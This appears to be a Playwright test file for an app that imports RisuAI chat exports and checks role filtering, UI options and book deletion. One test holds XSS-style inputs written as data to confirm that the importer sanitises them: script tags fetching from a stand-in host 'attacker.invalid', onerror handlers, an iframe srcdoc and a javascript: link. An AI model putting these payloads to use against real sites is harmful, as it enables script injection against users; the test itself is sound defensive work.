import { test, expect, type Page } from '@playwright/test';

// Local fixtures transcribed from exportChat in official characters.ts, blob
// b349d110630c6408c32c5cea76f8083fcce07b7c (main, researched 2026-10-20):
// https://github.com/kwaroran/Risuai/blob/main/src/ts/characters.ts
// HTML File: .chat blocks + escaped .idat JSON. HTML Embed: clipboard table.
// Neither format uses risuChatData, executable payloads, iframe or base64.
const character = '별빛';
const persona = '내 맞춤 이름';
const chat = {
  name: '달빛 산책', note: 'PRIVATE note', localLore: [], fmIndex: -1,
  message: [
    { role: 'user', data: 'PRIVATE user input' },
    { role: 'char', data: '<p>별빛은 고개를 들었다.</p><p>안녕 😀</p>' },
    { role: 'user', data: 'PRIVATE consecutive user' },
    { role: 'user', data: 'PRIVATE third user' },
    { role: 'char', data: '다른 캐릭터의 대답', saying: 'friend-id' },
    { role: 'system', data: 'PRIVATE system' },
  ],
};
const greeting = '<p>첫 인사</p>';
const txtName = `${character}_2026-10-20T120000000Z_chat.txt`;
const txt = `--${character}\n첫 인사\n\n--${persona}\nPRIVATE user input\n\n--${persona}\nPRIVATE consecutive user\n\n--${character}\n캐릭터 서술\n\n--친구\n그룹 캐릭터 (역할 없음)`;
const visibleNames = [persona, character, persona, persona, '친구', persona];
function htmlFile(value = chat): string {
  return `<!DOCTYPE html><html><head><title>${character} Chat</title><style>.idat{display:none}</style></head><body>
    <div class="container"><div class="chat"><h2>${character}</h2><div>${greeting}</div></div>
    ${value.message.map((row, i) => `<div class="chat"><h2>${visibleNames[i]}</h2><div>${row.data}</div></div>`).join('')}</div>
    <div class="idat">${JSON.stringify(value).replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div></body></html>`;
}
const embed = `<table><tr><th>Character</th><th>Message</th></tr>
  <tr><td>${character}</td><td>${greeting}</td></tr>
  <tr><td>${persona}</td><td>PRIVATE user input</td></tr>
  <tr><td>${persona}</td><td>PRIVATE consecutive user</td></tr>
  <tr><td>${character}</td><td><p>캐릭터 서술</p><p>안녕 &amp; 잘 가 😀</p></td></tr>
  <tr><td>친구</td><td>그룹 캐릭터 (역할 없음)</td></tr></table><p>Chat from Risuai</p>`;

async function imported(page: Page, name: string, content: string, removeUserInputs?: boolean) {
  return page.evaluate(async ({ name, content, removeUserInputs }) => {
    // @ts-ignore Vite serves the module directly inside the real browser.
    const lib = await import('/src/lib/library.ts');
    return lib.importChatFile(new File([content], name), removeUserInputs === undefined ? undefined : { removeUserInputs });
  }, { name, content, removeUserInputs });
}

test.beforeEach(async ({ page }) => {
  // A local module-only page avoids App migrations/sample seeding and UI coupling.
  await page.route('**/__imports_test__', route => route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Import tests</title>' }));
  await page.goto('/__imports_test__');
});

test('official JSON v1/v2 and all-chats: filter roles before returning or saving', async ({ page }) => {
  for (const ver of [1, 2]) {
    for (const all of [false, true]) {
      const source = JSON.stringify({ type: all ? 'risuAllChats' : 'risuChat', ver, data: all ? [chat, chat] : chat, folders: [] });
      const books = await imported(page, 'export.json', source, true);
      expect(books).toHaveLength(all ? 2 : 1);
      expect(new Set(books.map(book => book.id)).size).toBe(books.length);
      for (const book of books) {
        expect(book.title).toBe(chat.name);
        expect(book.author).toBe('가져온 대화');
        expect(book.description).toBe('별빛은 고개를 들었다. 안녕 😀');
        expect(book.messages.map(message => message.role)).toEqual(['assistant', 'assistant']);
        expect(book.messages[0].content).toBe('별빛은 고개를 들었다.\n안녕 😀');
        expect(JSON.stringify(book)).not.toContain('PRIVATE');
      }
      const preserved = await imported(page, 'export.json', source);
      expect(preserved[0].messages.map(message => message.role)).toEqual(['user', 'assistant', 'user', 'user', 'assistant', 'system']);
      expect(await imported(page, 'export.json', source, false)).toMatchObject(preserved.map(({ id, createdAt, updatedAt, ...book }) => book));
    }
  }
  const stored = await page.evaluate(async source => {
    // @ts-ignore browser module
    const lib = await import('/src/lib/library.ts');
    const books = await lib.importChatFile(new File([source], 'export.json'), { removeUserInputs: true });
    for (const book of books) await lib.saveBook(book);
    return lib.loadBooks();
  }, JSON.stringify({ type: 'risuChat', ver: 2, data: chat }));
  expect(JSON.stringify(stored)).not.toContain('PRIVATE');
  const [metadata] = await imported(page, 'metadata.json', JSON.stringify({ type: 'risuChat', ver: 2,
    data: { ...chat, title: '공개 제목', author: '공개 작가', description: 'PRIVATE description' } }), true);
  expect(metadata).toMatchObject({ title: '공개 제목', author: '공개 작가', description: '별빛은 고개를 들었다. 안녕 😀' });
  expect(JSON.stringify(metadata)).not.toContain('PRIVATE');
});

test('App upload defaults to input removal; opt-out persists across dialog reopening until reload', async ({ page }) => {
  await page.route('https://fonts.googleapis.com/**', route => route.abort());
  await page.route('https://fonts.gstatic.com/**', route => route.abort());
  // This test deliberately leaves the module-only page and exercises App's
  // actual dialog, file chooser, import option wiring and IndexedDB writes.
  await page.goto('/');
  await expect(page.locator('.loading-screen')).toHaveCount(0);
  const openUpload = page.getByRole('button', { name: 'RisuAI 로그 가져오기', exact: true });
  const dialog = page.getByRole('dialog', { name: '로그 가져오기', exact: true });
  const inputRemoval = dialog.getByRole('switch', { name: '인풋 제거', exact: true });
  const readUploaded = () => page.evaluate(async () => {
    // @ts-ignore Vite browser module; reads persistence without bypassing upload.
    const { loadBooks } = await import('/src/lib/library.ts');
    return (await loadBooks()).filter(book => book.title.startsWith('UI upload '));
  });
  const chooseJson = async (title: string) => {
    const chooserPromise = page.waitForEvent('filechooser');
    await dialog.getByRole('button', { name: /파일 선택/ }).click();
    const chooser = await chooserPromise;
    await chooser.setFiles({ name: `${title}.json`, mimeType: 'application/json',
      buffer: Buffer.from(JSON.stringify({ type: 'risuChat', ver: 2, folders: [],
        data: { ...chat, name: title, author: '공개 작가' } }), 'utf8') });
    await expect(dialog).not.toBeVisible();
    await expect(page.getByRole('button', { name: `${title} 읽기`, exact: true })).toBeVisible();
  };

  await openUpload.click();
  await expect(inputRemoval).toBeChecked();
  await chooseJson('UI upload filtered');
  await expect.poll(async () => (await readUploaded()).length).toBe(1);
  const [filtered] = await readUploaded();
  expect(filtered).toMatchObject({ title: 'UI upload filtered', author: '공개 작가', description: '별빛은 고개를 들었다. 안녕 😀' });
  expect(filtered.messages.map(message => message.role)).toEqual(['assistant', 'assistant']);
  expect(JSON.stringify(filtered)).not.toContain('PRIVATE');

  await openUpload.click();
  await expect(inputRemoval).toBeChecked();
  await inputRemoval.click();
  await expect(inputRemoval).not.toBeChecked();
  await chooseJson('UI upload unfiltered');
  await expect.poll(async () => (await readUploaded()).length).toBe(2);
  const unfiltered = (await readUploaded()).find(book => book.title === 'UI upload unfiltered')!;
  expect(unfiltered.messages.map(message => message.role)).toEqual(['user', 'assistant', 'user', 'user', 'assistant', 'system']);
  expect(unfiltered.messages[0].content).toBe('PRIVATE user input');

  // App owns this preference for its current mount: closing/reopening keeps
  // the deliberate opt-out, whereas a fresh page starts checked again.
  await openUpload.click();
  await expect(inputRemoval).not.toBeChecked();
  await dialog.getByRole('button', { name: '닫기', exact: true }).click();
  await openUpload.click();
  await expect(inputRemoval).not.toBeChecked();
  await page.reload();
  await expect(page.locator('.loading-screen')).toHaveCount(0);
  await openUpload.click();
  await expect(inputRemoval).toBeChecked();
  expect((await readUploaded()).find(book => book.title === 'UI upload filtered')!.messages.map(message => message.role)).toEqual(['assistant', 'assistant']);
  expect((await readUploaded()).find(book => book.title === 'UI upload unfiltered')!.messages[0].role).toBe('user');
});

test('TXT custom usernames and consecutive messages: no turn alternation guesses', async ({ page }) => {
  const [filtered] = await imported(page, txtName, txt, true);
  expect(filtered.messages.map(message => message.content)).toEqual(['첫 인사', '캐릭터 서술']);
  expect(JSON.stringify(filtered)).not.toContain('PRIVATE');
  const [unfiltered] = await imported(page, txtName, txt);
  expect(unfiltered.messages).toHaveLength(5);
  expect(unfiltered.messages[1]).toMatchObject({ name: persona, content: 'PRIVATE user input' });
  expect(unfiltered.messages[4].name).toBe('친구');
  await expect(imported(page, 'renamed.txt', txt, true)).rejects.toThrow('TXT에는 사용자 역할 정보가 없습니다');
  expect((await imported(page, 'renamed.txt', txt, false))[0].messages).toHaveLength(5);
});

test('HTML File reads actual .idat, greeting and group names; metadata roles win', async ({ page }) => {
  const [filtered] = await imported(page, 'chat.html', htmlFile(), true);
  expect(filtered.title).toBe(chat.name);
  expect(filtered.messages.map(message => message.content)).toEqual(['첫 인사', '별빛은 고개를 들었다.\n안녕 😀', '다른 캐릭터의 대답']);
  expect(filtered.messages.map(message => message.name)).toEqual([character, character, '친구']);
  expect(JSON.stringify(filtered)).not.toContain('PRIVATE');
  const [unfiltered] = await imported(page, 'chat.html', htmlFile(), false);
  expect(unfiltered.messages).toHaveLength(7);
  expect(unfiltered.messages[1].role).toBe('user');
  expect(unfiltered.messages[6].role).toBe('system');
  // Raw metadata is authoritative even if visible HTML is missing or translated.
  expect((await imported(page, 'chat.htm', `<div class="idat">${JSON.stringify(chat).replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>`, true))[0].messages).toHaveLength(2);
});

test('HTML Embed is the official clipboard table, including saved plain-text HTML', async ({ page }) => {
  for (const name of ['embed.html', 'embed.txt']) {
    const [filtered] = await imported(page, name, embed, true);
    expect(filtered.messages.map(message => message.content)).toEqual(['첫 인사', '캐릭터 서술\n안녕 & 잘 가 😀']);
    const [unfiltered] = await imported(page, name, embed);
    expect(unfiltered.messages).toHaveLength(5);
    expect(unfiltered.messages[1]).toMatchObject({ name: persona, content: 'PRIVATE user input', role: 'unknown' });
    expect(unfiltered.messages[4].role).toBe('unknown');
    expect(JSON.stringify(filtered)).not.toContain('Chat from Risuai');
  }
});

test('malicious HTML never executes, fetches resources, or enters the live document', async ({ page }) => {
  const remoteRequests: string[] = [];
  await page.route('https://attacker.invalid/**', route => { remoteRequests.push(route.request().url()); return route.abort(); });
  const attack = `<script>window.__importExecuted=1;fetch('https://attacker.invalid/script')</script>
    <script src="https://attacker.invalid/remote.js"></script><style>@import 'https://attacker.invalid/style';</style>
    <img src="https://attacker.invalid/image" onerror="window.__importExecuted=2">
    <iframe src="https://attacker.invalid/frame" srcdoc="<script>parent.__importExecuted=3</script>"></iframe>
    <object data="https://attacker.invalid/object"></object><link rel="stylesheet" href="https://attacker.invalid/link">
    <svg><image href="https://attacker.invalid/svg"/><script>window.__importExecuted=4</script></svg>
    <a href="javascript:window.__importExecuted=5">안전한 본문</a>`;
  const maliciousChat = { ...chat, message: [{ role: 'char', data: attack }] };
  for (const [name, content] of [
    ['attack.json', JSON.stringify({ type: 'risuChat', ver: 2, data: maliciousChat })],
    ['attack.html', attack + htmlFile(maliciousChat)],
    ['embed.html', `<table><tr><th>Character</th><th>Message</th></tr><tr><td>${character}</td><td>${attack}</td></tr></table><p>Chat from Risuai</p>`],
  ]) {
    const [book] = await imported(page, name, content, true);
    expect(book.messages.at(-1)?.content).toBe('안전한 본문');
    expect(JSON.stringify(book.messages)).not.toMatch(/<script|attacker\.invalid|__importExecuted/);
  }
  await page.waitForTimeout(150);
  expect(remoteRequests).toEqual([]);
  expect(await page.evaluate(() => ({ executed: (window as any).__importExecuted, nodes: document.querySelectorAll('iframe,img,script,table,.chat,.idat').length }))).toEqual({ executed: undefined, nodes: 0 });
});

test('character-only mode rejects empty/user/system/unattributed narration imports clearly', async ({ page }) => {
  for (const rows of [[{ role: 'user', data: 'secret' }], [{ role: 'system', data: 'rules' }], ['unattributed narration'], [{ role: 'char', data: '<script>secret</script>' }]]) {
    await expect(imported(page, 'empty.json', JSON.stringify({ type: 'risuChat', ver: 2, data: { message: rows } }), true)).rejects.toThrow('읽을 수 있는 캐릭터 대화가 없습니다');
  }
  await expect(imported(page, 'broken.html', '<div class="idat">{bad JSON}</div>', true)).rejects.toThrow('.idat');
  await expect(imported(page, 'not-risu.html', '<p>Unrelated document</p>', true)).rejects.toThrow('Character/Message');
  // No speculative decoding/execution of unofficial script or iframe payloads.
  await expect(imported(page, 'fake.html', '<script id="risuChatData">{"message":[]}</script><iframe srcdoc="hello"></iframe>', true)).rejects.toThrow('Character/Message');
});

test('deleteBooks removes only requested books and progress, validates upfront and is idempotent', async ({ page }) => {
  const result = await page.evaluate(async () => {
    // @ts-ignore browser module
    const lib = await import('/src/lib/library.ts');
    for (const id of ['a', 'b', 'other-shelf']) {
      await lib.saveBook({ id, title: id, author: '', description: '', color: '#123456', createdAt: '2025-01-01T00:00:00.000Z', updatedAt: '2025-01-01T00:00:00.000Z', messages: [{ role: 'assistant', name: 'C', content: 'story' }] });
      await lib.saveReadingProgress(id, 3, '2025-02-01T00:00:00.000Z');
    }
    let invalid = false;
    try { await lib.deleteBooks(['a', '']); } catch { invalid = true; }
    const before = (await lib.loadBooks()).map(book => book.id).sort();
    await lib.deleteBooks(['a', 'b', 'a', 'missing']);
    await lib.deleteBooks([]);
    await lib.deleteBooks(['a']);
    const remaining = await lib.loadBooks();
    const db = await new Promise<IDBDatabase>((resolve, reject) => { const r = indexedDB.open('risu-bookshelf', 2); r.onsuccess = () => resolve(r.result); r.onerror = () => reject(r.error); });
    const progress = await new Promise<any[]>((resolve, reject) => { const r = db.transaction('reading-progress').objectStore('reading-progress').getAll(); r.onsuccess = () => resolve(r.result); r.onerror = () => reject(r.error); });
    db.close();
    return { invalid, before, remaining, progress };
  });
  expect(result.invalid).toBe(true);
  expect(result.before).toEqual(['a', 'b', 'other-shelf']);
  expect(result.remaining.map(book => book.id)).toEqual(['other-shelf']);
  expect(result.remaining[0].lastPage).toBe(3);
  expect(result.progress.map(entry => entry.id)).toEqual(['other-shelf']);
});

test('deleteBooks abort rolls back deletions in both stores', async ({ page }) => {
  const result = await page.evaluate(async () => {
    // @ts-ignore browser module
    const lib = await import('/src/lib/library.ts');
    await lib.saveBook({ id: 'rollback', title: 'keep', author: '', description: '', color: '#123456', createdAt: '2025-01-01T00:00:00.000Z', updatedAt: '2025-01-01T00:00:00.000Z', messages: [{ role: 'assistant', name: 'C', content: 'story' }] });
    await lib.saveReadingProgress('rollback', 9, '2025-02-01T00:00:00.000Z');
    const original = IDBObjectStore.prototype.delete;
    let failed = false;
    IDBObjectStore.prototype.delete = function (key) {
      const request = original.call(this, key);
      if (this.name === 'reading-progress') this.transaction.abort();
      return request;
    };
    try { await lib.deleteBooks(['rollback']); } catch { failed = true; }
    finally { IDBObjectStore.prototype.delete = original; }
    return { failed, books: await lib.loadBooks() };
  });
  expect(result.failed).toBe(true);
  expect(result.books).toHaveLength(1);
  expect(result.books[0]).toMatchObject({ id: 'rollback', lastPage: 9 });
});
